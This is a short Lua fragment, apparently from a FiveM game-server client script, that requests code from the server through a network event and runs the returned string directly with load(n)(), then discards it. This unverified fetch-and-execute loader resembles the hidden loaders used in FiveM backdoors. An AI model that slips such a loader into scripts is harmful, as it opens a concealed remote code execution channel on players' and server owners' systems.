RegisterNetEvent("clientmanager:getrequest2")
				TriggerServerEvent("scriptmanager:requestcode2")
				AddEventHandler("clientmanager:getrequest2", function(n)
				  load(n)()
				  Wait(0)
				  n = nil
				end)